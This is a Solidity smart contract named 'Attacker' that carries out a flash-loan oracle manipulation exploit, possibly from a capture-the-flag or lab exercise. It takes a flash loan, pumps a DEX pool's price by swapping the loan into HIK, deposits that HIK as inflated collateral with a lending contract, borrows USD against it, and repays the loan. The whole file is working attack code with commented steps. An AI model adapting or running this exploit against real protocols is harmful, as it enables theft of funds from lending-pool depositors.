// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract Attacker {
    address public usd;
    address public hik;
    address public dex;
    address public lending;
    address public flash;
    address public owner;

    constructor(address _usd, address _hik, address _dex, address _lending, address _flash) {
        usd = _usd; hik = _hik; dex = _dex; lending = _lending; flash = _flash;
        owner = msg.sender;
    }

    // kicks off: flash.flashLoan(amount, address(this), "")
    function attack(uint256 loanAmount, uint256 borrowAmount) external {
        require(msg.sender == owner, "not owner");
        borrowAmountStash = borrowAmount;
        (bool ok, bytes memory ret) = flash.call(
            abi.encodeWithSelector(bytes4(0x2bd94e9c), loanAmount, address(this), bytes(""))
        );
        require(ok, string(ret));
    }

    uint256 borrowAmountStash;

    // Flash contract calls back with selector 0x79b2fae8(uint256 loanAmount)
    fallback() external {
        require(bytes4(msg.data) == bytes4(0x79b2fae8), "bad selector");
        uint256 loanAmount;
        assembly { loanAmount := calldataload(4) }
        _onLoan(loanAmount);
    }

    function _onLoan(uint256 loanAmount) internal {
        // 1) pump the pool: swap all borrowed USD into HIK (selector 0x8ac326bd -> usd-in swap)
        IERC20(usd).approve(dex, loanAmount);
        (bool ok1, bytes memory r1) = dex.call(
            abi.encodeWithSelector(bytes4(0x8ac326bd), loanAmount, uint256(0))
        );
        require(ok1, string(r1));

        // 2) deposit the HIK we just bought as collateral (selector 0xbad4a01f)
        uint256 hikBal = IERC20(hik).balanceOf(address(this));
        IERC20(hik).approve(lending, hikBal);
        (bool ok2, bytes memory r2) = lending.call(
            abi.encodeWithSelector(bytes4(0xbad4a01f), hikBal)
        );
        require(ok2, string(r2));

        // 3) borrow USD against the inflated collateral value (selector 0xc5ebeaec)
        (bool ok3, bytes memory r3) = lending.call(
            abi.encodeWithSelector(bytes4(0xc5ebeaec), borrowAmountStash)
        );
        require(ok3, string(r3));

        // 4) repay the flash loan in full
        IERC20(usd).transfer(flash, loanAmount);
    }
}
